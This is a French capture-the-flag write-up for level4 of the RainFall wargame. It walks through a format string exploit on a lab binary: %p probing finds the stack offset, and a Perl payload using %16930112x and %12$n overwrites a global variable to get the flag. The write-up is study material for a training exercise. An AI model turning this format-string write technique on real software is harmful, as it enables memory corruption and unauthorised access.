# level4

On se retrouve avec un pattern similaire au level précédent.

On doit modifier la valeur d'une variable globale `m` situé à l'adresse `0x8049810` pour qu'elle soit égale à `0x1025544`.

On a une taille d'input limité par la fonction `fgets()` et un `printf()` non protégé.

On procède comme précédemment pour obtenir la position écrite par printf (12) :
```bash
AAAA %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p
AAAA 0xb7ff26b0 0xbffff764 0xb7fd0ff4 (nil) (nil) 0xbffff728 0x804848d 0xbffff520 0x200 0xb7fd1ac0 0xb7ff37d0 0x41414141 0x20702520 0x25207025 0x70252070 0x20702520 0x25207025
```

Cette fois ci on doit écrire une valeur beaucoup plus grande que dans le level précédent : 16930116 (0x1025544 en décimal).

On ne pourrait pas écrire autant de caractères avec la méthode de padding précédente, car seul une quantité limité de notre input est prise en compte.

Cependant, en utilisant la même logique d'exploit des valeurs de format de printf on peut arriver à écrire beaucoup plus de caractères que ce qui nous est imposé par notre buffer :
`%100x` va afficher au minimum 100 caractères dont la valeur de l'argument x.

En applicant cette idée on obtient le payload suivant :
```bash
perl -e 'print "\x10\x98\x04\x08"."%16930112x"."%12\$n"' > /tmp/payload
```
Et en lançant l'executable avec ce payload, on arrive à obtenir le flag !
```bash
level4@RainFall:~$ ./level4 < /tmp/payload

< lots of spaces >

        0f99ba5e9c446258a69b290407a6c60859e9c2d25b26575cafc9ae6d75e9456a
```
